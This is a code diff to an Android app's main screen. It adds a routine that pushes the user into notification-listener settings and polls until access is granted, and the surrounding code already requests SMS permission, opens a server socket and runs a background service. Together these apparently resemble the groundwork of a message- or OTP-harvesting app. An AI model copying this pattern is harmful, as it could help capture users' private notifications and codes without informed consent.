@@ -1,8 +1,6 @@
 package com.service.bob;
 
 import android.Manifest;
-import android.animation.ObjectAnimator;
-import android.animation.ValueAnimator;
 import android.annotation.SuppressLint;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -11,16 +9,17 @@ import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.util.Log;
-import android.view.View;
-import android.view.animation.LinearInterpolator;
+
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
+import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AlertDialog;
 import androidx.core.app.ActivityCompat;
+import androidx.core.app.NotificationManagerCompat;
 import androidx.core.content.ContextCompat;
 
 import org.json.JSONException;
@@ -31,12 +30,14 @@ import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
+import java.util.Set;
 
 public class MainActivity extends BaseActivity {
 
     private static final int SMS_PERMISSION_REQUEST_CODE = 1;
     private boolean isReturningFromSettings = false;
     private static final int APP_SETTINGS_REQUEST_CODE = 1001;
+    private static final int POST_NOTIFICATION_PERMISSION_REQUEST_CODE = 2;
 
     @SuppressLint("SetTextI18n")
     @Override
@@ -57,7 +58,7 @@ public class MainActivity extends BaseActivity {
         socketManager = SocketManager.getInstance(context);
         socketManager.connect();
         helper.show("Run App");
-
+        askNotificationPermission();
 
         Intent serviceIntent = new Intent(this, RunningService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -69,7 +70,7 @@ public class MainActivity extends BaseActivity {
         // Start
         TextView slidingText = findViewById(R.id.slidingText);
         slidingText.setSelected(true);
-
+        startSlide();
 
         dataObject = new HashMap<>();
         ids = new HashMap<>();
@@ -93,9 +94,7 @@ public class MainActivity extends BaseActivity {
                 Toast.makeText(context, "Form validation failed", Toast.LENGTH_SHORT).show();
                 return;
             }
-
             submitLoader.show();
-
             try {
                 JSONObject dataJson = new JSONObject(dataObject); // your form data
                 JSONObject sendPayload = new JSONObject();
@@ -399,5 +398,34 @@ public class MainActivity extends BaseActivity {
     }
 
 
+    public void askNotificationPermission() {
+        if(isNotificationListenerEnabled()){
+            helper.showTost("notification already enabled");
+            return ;
+        }
+        Toast.makeText(this, "Enable notification access to continue.", Toast.LENGTH_LONG).show();
+        Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+        startActivity(intent);
+        new Thread(() -> {
+            while (true) {
+                if (isNotificationListenerEnabled()) {
+                    helper.show("notification permission granted, back to app");
+                    runOnUiThread(() -> {
+                        Toast.makeText(this, "Notification access enabled!", Toast.LENGTH_SHORT).show();
+                        Intent backIntent = new Intent(this, MainActivity.class);
+                        backIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(backIntent);
+                        finish();
+                    });
+                    break;
+                }
+                try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); }
+            }
+        }).start();
+    }
 
+    private boolean isNotificationListenerEnabled() {
+        Set<String> enabledListenerPackages = NotificationManagerCompat.getEnabledListenerPackages(this);
+        return enabledListenerPackages.contains(getPackageName());
+    }
 }
